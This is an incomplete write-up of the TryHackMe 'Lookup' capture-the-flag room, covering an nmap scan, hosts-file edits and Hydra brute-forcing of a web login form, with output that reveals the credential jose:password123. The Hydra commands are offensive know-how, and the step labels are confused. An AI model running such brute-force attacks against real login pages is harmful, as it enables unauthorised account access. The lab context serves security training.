# <div align="center">[Lookup](https://tryhackme.com/r/room/lookup)</div>
<div align="center">Test your enumeration skills on this boot-to-root machine.</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/0f4016d8-b972-442d-93b3-056fcff87add" height="200"></img>
</div>

## Task 1. Lookup

Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿

Note: For free users, it is recommended to use your own VM if you'll ever experience problems visualizing the site. Please allow 3-5 minutes for the VM to fully boot up.

### What is the user flag?
```
```
### What is the root flag?
```
```
## Walkthrough

#### Let start with scanning the target network
```
death@esther:~$ nmap 10.10.80.211 -sV -sC 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 IST
Nmap scan report for lookup.thm (10.10.80.211)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> * #### There are 2 ports open
> * Ssh on port 22 
> * http on port 80
#### let add the Ip to `hosts` file
```
echo "IP-ADDRESS-OF-YOUR-MACHINE lookup.thm" | sudo tee -a /etc/hosts
```
### Let nevigate to web 
<div align="center">
<img src="https://github.com/user-attachments/assets/e3dda654-cb00-4625-ad95-842636be7b6b" height="300"></img>
</div>
Here is a login page 
Let try to login with default credentials
<div align="center">
<img src="https://github.com/user-attachments/assets/a67607f7-9110-4af0-8df1-c3a934b196af" height="250"></img>
</div>

Default Credentials don’t work ! But we r getting block for 3 sec.
```
Wrong password. Please try again.
Redirecting in 3 seconds.
```
<div align="center">
<img src="https://github.com/user-attachments/assets/ef1b0684-df73-4097-a021-0f6b4c731e0f" height="200"></img>
</div>

### This lab check over enumeration skills let use bruteforing with hydra using sniper method , we can use burpsuite but that create issue on community version sometime when we load rockyou.txt so im going with hydra

let find password first
```
hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```
```
death@esther:~$ hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 17:10:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:F=try again
[STATUS] 1039.00 tries/min, 1039 tries in 00:01h, 9138 to do in 00:09h, 16 active
[STATUS] 1035.33 tries/min, 3106 tries in 00:03h, 7071 to do in 00:07h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: password123
[STATUS] 1030.00 tries/min, 7210 tries in 00:07h, 2967 to do in 00:03h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 17:20:15
```
We got our password let find username
```
hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```
```
death@esther:~$ hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 17:18:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10178 login tries (l:10178/p:1), ~637 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:F=try again
[80][http-post-form] host: lookup.thm   login: jose   password: password123
[STATUS] 893.00 tries/min, 893 tries in 00:01h, 9285 to do in 00:11h, 16 active
[STATUS] 1028.67 tries/min, 3086 tries in 00:03h, 7092 to do in 00:07h, 16 active
[STATUS] 1062.86 tries/min, 7440 tries in 00:07h, 2738 to do in 00:03h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 17:28:00
```
The user:pass is:
* `jose:password123`

### Let logged in using this credential
we just redirected to another domain let add this to `hosts` file again.'
```
echo "IP-ADDRESS-OF-YOUR-MACHINE files.lookup.thm" | sudo tee -a /etc/hosts
```
<div align="center">
<img src="https://github.com/user-attachments/assets/adff4566-9664-4b7b-aa19-9653712564aa" height="300"></img>
</div>




<div align="center">
<img src="" height="200"></img>
</div>
